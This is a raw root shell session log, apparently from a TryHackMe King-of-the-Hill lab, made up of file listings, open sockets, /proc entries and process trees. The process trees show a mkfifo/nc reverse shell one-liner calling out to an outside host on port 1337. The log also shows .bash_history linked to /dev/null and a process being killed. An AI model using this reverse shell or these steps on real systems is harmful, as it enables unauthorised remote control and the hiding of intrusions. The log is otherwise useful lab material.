lrwxrwxrwx  1 root root   16 Feb  6  2020 libudev.so.1 -> libudev.so.1.6.9
-rw-r--r--  1 root root 119K Feb  6  2020 libudev.so.1.6.9
lrwxrwxrwx  1 root root   20 Aug 11  2016 libulockmgr.so.1 -> libulockmgr.so.1.0.1
-rw-r--r--  1 root root  10K Aug 11  2016 libulockmgr.so.1.0.1
lrwxrwxrwx  1 root root   19 Jun 24  2017 libusb-1.0.so.0 -> libusb-1.0.so.0.1.0
-rw-r--r--  1 root root  95K Jun 24  2017 libusb-1.0.so.0.1.0
-rw-r--r--  1 root root  11K Apr 16  2018 libutil-2.27.so
lrwxrwxrwx  1 root root   15 Apr 16  2018 libutil.so.1 -> libutil-2.27.so
lrwxrwxrwx  1 root root   16 Jan  8  2020 libuuid.so.1 -> libuuid.so.1.3.0
-rw-r--r--  1 root root  27K Jan  8  2020 libuuid.so.1.3.0
lrwxrwxrwx  1 root root   16 Oct 29  2017 libwrap.so.0 -> libwrap.so.0.7.6
-rw-r--r--  1 root root  39K Oct 29  2017 libwrap.so.0.7.6
lrwxrwxrwx  1 root root   14 May 23  2017 libz.so.1 -> libz.so.1.2.11
-rw-r--r--  1 root root 115K May 23  2017 libz.so.1.2.11
drwxr-xr-x  2 root root 4.0K Mar 20  2020 security

cd ..
ls -la
total 212
drwxr-xr-x 22 root root  4096 Dec  8 22:34 .
drwxr-xr-x 24 root root  4096 Mar 19  2020 ..
drwxr-xr-x  2 root root  4096 Aug  5  2019 apparmor
drwxr-xr-x  2 root root  4096 Aug  5  2019 console-setup
lrwxrwxrwx  1 root root    21 Mar 20  2020 cpp -> /etc/alternatives/cpp
drwxr-xr-x  3 root root  4096 Mar 19  2020 crda
drwxr-xr-x  4 root root  4096 Aug  5  2019 cryptsetup
drwxr-xr-x  2 root root  4096 Aug  5  2019 ebtables
drwxr-xr-x 84 root root 20480 Mar 19  2020 firmware
drwxr-xr-x  2 root root  4096 Aug  5  2019 hdparm
drwxr-xr-x  2 root root  4096 Aug  5  2019 init
-rwxr-xr-x  1 root root 74656 Nov  9  2017 klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
lrwxrwxrwx  1 root root    18 Apr 18  2018 libhandle.so.1 -> libhandle.so.1.0.3
-rw-r--r--  1 root root 14416 Apr 18  2018 libhandle.so.1.0.3
drwxr-xr-x  3 root root  4096 Aug  5  2019 lsb
drwxr-xr-x  2 root root  4096 Mar 20  2020 modprobe.d
drwxr-xr-x  3 root root  4096 Mar 19  2020 modules
drwxr-xr-x  2 root root  4096 Aug  5  2019 modules-load.d
drwxr-xr-x  2 root root  4096 Mar 20  2020 netplan
drwxr-xr-x  2 root root  4096 Aug  5  2019 open-iscsi
drwxr-xr-x  3 root root  4096 Aug  5  2019 recovery-mode
drwxr-xr-x  8 root root 12288 Mar 20  2020 systemd
drwxr-xr-x 15 root root  4096 Feb 12  2018 terminfo
drwxr-xr-x  4 root root  4096 Mar 20  2020 udev
drwxr-xr-x  2 root root  4096 Aug  5  2019 ufw
drwxr-xr-x  4 root root 12288 Mar 20  2020 x86_64-linux-gnu
cd
ls -la
total 7260
drwx------  4 root root    4096 Dec  8 23:04 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Dec  8 23:04 .bash_history -> /dev/null
-rw-r--r--  1 root root    3385 Dec  8 23:00 .bashrc
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Dec  8 23:00 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Dec  8 23:10 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
cd /var/log
lsof -i -P -n
COMMAND    PID             USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd-t  508 systemd-timesync   14u  IPv4  94495      0t0  UDP *:50281 
systemd-n  610  systemd-network   15u  IPv4  58583      0t0  UDP 10.10.69.206:68 
systemd-r  623  systemd-resolve   12u  IPv4  17993      0t0  UDP 127.0.0.53:53 
systemd-r  623  systemd-resolve   13u  IPv4  17994      0t0  TCP 127.0.0.53:53 (LISTEN)
img        729        tryhackme    3u  IPv6  20080      0t0  TCP *:16109 (LISTEN)
main       745            bread    3u  IPv6  20031      0t0  TCP *:15065 (LISTEN)
inetd      751             root    7u  IPv4  20010      0t0  TCP *:46969 (LISTEN)
koth       789             root    3u  IPv6  21149      0t0  TCP *:9999 (LISTEN)
sshd       819             root    3u  IPv4  21389      0t0  TCP *:22 (LISTEN)
sshd       819             root    4u  IPv6  21400      0t0  TCP *:22 (LISTEN)
mysqld     841            mysql   27u  IPv4  21815      0t0  TCP *:3306 (LISTEN)
bash      1487             root    0u  IPv4  54388      0t0  TCP 10.10.69.206:57114->10.2.66.237:47983 (ESTABLISHED)
bash      1487             root    1u  IPv4  54388      0t0  TCP 10.10.69.206:57114->10.2.66.237:47983 (ESTABLISHED)
bash      1487             root    2u  IPv4  54388      0t0  TCP 10.10.69.206:57114->10.2.66.237:47983 (ESTABLISHED)
bash      1487             root  255u  IPv4  54388      0t0  TCP 10.10.69.206:57114->10.2.66.237:47983 (ESTABLISHED)
nc        1558            bread    3u  IPv4  54735      0t0  TCP 10.10.69.206:56222->10.11.55.164:1337 (ESTABLISHED)
env
PWD=/var/log
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env
OLDPWD=/root
ls -la /proc/*/cwd
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/1/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/10/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/100/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/11/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/117/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/12/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/13/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:42 /proc/1362/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/14/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1425/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/15/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1544/cwd -> /
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1549/cwd -> /home/bread
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1556/cwd -> /home/bread
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1557/cwd -> /tmp
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1558/cwd -> /home/bread
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1563/cwd -> /var/log
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1575/cwd -> /etc/.k
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1591/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/16/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1647/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/167/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/17/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/18/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/19/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/2/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/20/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/21/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/22/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/23/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/24/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/25/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/26/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/263/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/27/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/28/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/29/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/30/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/31/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/316/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/317/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/32/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/33/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/36/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/367/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/37/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/38/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/397/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/399/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/4/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/402/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/403/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/404/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/405/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/406/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/408/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/417/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/419/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/421/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/4676/cwd -> /
lrwxrwxrwx 1 systemd-timesync systemd-timesync 0 Dec  8 22:32 /proc/508/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/6/cwd -> /
lrwxrwxrwx 1 systemd-network  systemd-network  0 Dec  8 22:32 /proc/610/cwd -> /
lrwxrwxrwx 1 systemd-resolve  systemd-resolve  0 Dec  8 22:32 /proc/623/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/7/cwd -> /
lrwxrwxrwx 1 tryhackme        tryhackme        0 Dec  8 22:32 /proc/729/cwd -> /home/tryhackme
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/743/cwd -> /
lrwxrwxrwx 1 bread            bread            0 Dec  8 22:32 /proc/745/cwd -> /home/bread
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/747/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/751/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/753/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/755/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/756/cwd -> /var/spool/cron/atjobs
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/763/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/788/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/789/cwd -> /root
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/791/cwd -> /var/spool/cron
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/792/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/8/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/80/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/800/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/809/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/81/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/815/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/816/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/819/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/82/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/83/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/84/cwd -> /
lrwxrwxrwx 1 mysql            mysql            0 Dec  8 22:32 /proc/841/cwd -> /var/lib/mysql
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/85/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/9/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/91/cwd -> /
lrwxrwxrwx 1 ramen            ramen            0 Dec  8 22:32 /proc/956/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/966/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/self/cwd -> /var/log
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/thread-self/cwd -> /var/log
cd
ps -eaf --forest
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 22:31 ?        00:00:00 [kthreadd]
root         4     2  0 22:31 ?        00:00:00  \_ [kworker/0:0H]
root         6     2  0 22:31 ?        00:00:00  \_ [mm_percpu_wq]
root         7     2  0 22:31 ?        00:00:00  \_ [ksoftirqd/0]
root         8     2  0 22:31 ?        00:00:01  \_ [rcu_sched]
root         9     2  0 22:31 ?        00:00:00  \_ [rcu_bh]
root        10     2  0 22:31 ?        00:00:00  \_ [migration/0]
root        11     2  0 22:31 ?        00:00:00  \_ [watchdog/0]
root        12     2  0 22:31 ?        00:00:00  \_ [cpuhp/0]
root        13     2  0 22:31 ?        00:00:00  \_ [kdevtmpfs]
root        14     2  0 22:31 ?        00:00:00  \_ [netns]
root        15     2  0 22:31 ?        00:00:00  \_ [rcu_tasks_kthre]
root        16     2  0 22:31 ?        00:00:00  \_ [kauditd]
root        17     2  0 22:31 ?        00:00:00  \_ [xenbus]
root        18     2  0 22:31 ?        00:00:00  \_ [xenwatch]
root        19     2  0 22:31 ?        00:00:00  \_ [kworker/0:1]
root        20     2  0 22:31 ?        00:00:00  \_ [khungtaskd]
root        21     2  0 22:31 ?        00:00:00  \_ [oom_reaper]
root        22     2  0 22:31 ?        00:00:00  \_ [writeback]
root        23     2  0 22:31 ?        00:00:00  \_ [kcompactd0]
root        24     2  0 22:31 ?        00:00:00  \_ [ksmd]
root        25     2  0 22:31 ?        00:00:00  \_ [khugepaged]
root        26     2  0 22:31 ?        00:00:00  \_ [crypto]
root        27     2  0 22:31 ?        00:00:00  \_ [kintegrityd]
root        28     2  0 22:31 ?        00:00:00  \_ [kblockd]
root        29     2  0 22:31 ?        00:00:00  \_ [ata_sff]
root        30     2  0 22:31 ?        00:00:00  \_ [md]
root        31     2  0 22:31 ?        00:00:00  \_ [edac-poller]
root        32     2  0 22:31 ?        00:00:00  \_ [devfreq_wq]
root        33     2  0 22:31 ?        00:00:00  \_ [watchdogd]
root        36     2  0 22:31 ?        00:00:00  \_ [kswapd0]
root        37     2  0 22:31 ?        00:00:00  \_ [kworker/u31:0]
root        38     2  0 22:31 ?        00:00:00  \_ [ecryptfs-kthrea]
root        80     2  0 22:31 ?        00:00:00  \_ [kthrotld]
root        81     2  0 22:31 ?        00:00:00  \_ [acpi_thermal_pm]
root        82     2  0 22:31 ?        00:00:00  \_ [scsi_eh_0]
root        83     2  0 22:31 ?        00:00:00  \_ [scsi_tmf_0]
root        84     2  0 22:31 ?        00:00:00  \_ [scsi_eh_1]
root        85     2  0 22:31 ?        00:00:00  \_ [scsi_tmf_1]
root        91     2  0 22:31 ?        00:00:00  \_ [ipv6_addrconf]
root       100     2  0 22:31 ?        00:00:00  \_ [kstrp]
root       117     2  0 22:31 ?        00:00:00  \_ [charger_manager]
root       167     2  0 22:31 ?        00:00:00  \_ [ttm_swap]
root       263     2  0 22:31 ?        00:00:00  \_ [raid5wq]
root       316     2  0 22:31 ?        00:00:00  \_ [jbd2/xvda2-8]
root       317     2  0 22:31 ?        00:00:00  \_ [ext4-rsv-conver]
root       367     2  0 22:31 ?        00:00:00  \_ [kworker/0:1H]
root       399     2  0 22:31 ?        00:00:00  \_ [iscsi_eh]
root       402     2  0 22:31 ?        00:00:00  \_ [ib-comp-wq]
root       403     2  0 22:31 ?        00:00:00  \_ [ib-comp-unb-wq]
root       404     2  0 22:31 ?        00:00:00  \_ [ib_mcast]
root       405     2  0 22:31 ?        00:00:00  \_ [ib_nl_sa_wq]
root       406     2  0 22:31 ?        00:00:00  \_ [rdma_cm]
root       419     2  0 22:31 ?        00:00:00  \_ [loop0]
root       421     2  0 22:31 ?        00:00:00  \_ [loop1]
root      1425     2  0 22:43 ?        00:00:00  \_ [kworker/u30:2]
root      1544     2  0 22:55 ?        00:00:00  \_ [kworker/u30:1]
root      1591     2  0 23:00 ?        00:00:00  \_ [kworker/u30:5]
root      1647     2  0 23:00 ?        00:00:00  \_ [kworker/0:0]
root      4676     2  0 23:06 ?        00:00:00  \_ [kworker/0:2]
root         1     0  0 22:31 ?        00:00:06 /sbin/init maybe-ubiquity
root       397     1  0 22:31 ?        00:00:01 /lib/systemd/systemd-journald
root       408     1  0 22:31 ?        00:00:00 /sbin/lvmetad -f
root       417     1  0 22:31 ?        00:00:03 /lib/systemd/systemd-udevd
systemd+   508     1  0 22:31 ?        00:00:00 /lib/systemd/systemd-timesyncd
systemd+   610     1  0 22:31 ?        00:00:00 /lib/systemd/systemd-networkd
systemd+   623     1  0 22:31 ?        00:00:00 /lib/systemd/systemd-resolved
tryhack+   729     1  0 22:31 ?        00:00:00 /home/tryhackme/img
root       743     1  0 22:31 ?        00:00:00 /lib/systemd/systemd-logind
bread      745     1  0 22:31 ?        00:00:00 /home/bread/main
bread     1549   745  0 23:00 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  1549  0 23:00 ?        00:00:00      \_ cat /tmp/f
bread     1557  1549  0 23:00 ?        00:00:00      \_ sh -i
root      1563  1557  0 23:00 ?        00:00:00      |   \_ -i
root      7234  1563  0 23:10 ?        00:00:00      |       \_ ps -eaf --forest
bread     1558  1549  0 23:00 ?        00:00:00      \_ nc 10.11.55.164 1337
syslog     747     1  0 22:31 ?        00:00:00 /usr/sbin/rsyslogd -n
root       751     1  0 22:31 ?        00:00:00 /usr/sbin/inetd
root       753     1  0 22:31 ?        00:00:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755     1  0 22:31 ?        00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756     1  0 22:31 ?        00:00:00 /usr/sbin/atd -f
message+   763     1  0 22:31 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788     1  0 22:31 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
root       789     1  0 22:31 ?        00:00:00 /root/koth
root       791     1  0 22:31 ?        00:00:00 /usr/sbin/cron -f
root       792     1  0 22:31 ?        00:00:08 /usr/lib/snapd/snapd
root       800     1  0 22:31 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809     1  0 22:31 ttyS0    00:00:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815     1  0 22:31 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816     1  0 22:31 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root       819     1  0 22:31 ?        00:00:00 /usr/sbin/sshd -D
mysql      841     1  0 22:32 ?        00:00:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956     1  0 22:32 ?        00:00:00 /lib/systemd/systemd --user
ramen      966   956  0 22:32 ?        00:00:00  \_ (sd-pam)
root      1362     1  0 22:35 ?        00:00:01 /usr/bin/systemd-pam
root      1575     1  4 23:00 ?        00:00:28 /li
cd /tmp
kill -9 1362
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127776 18448 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18796  3572 ?        S    23:00   0:00      |   \_ -i
root      7357  0.0  0.3  37080  3420 ?        R    23:10   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.4 106640  4968 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24908 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
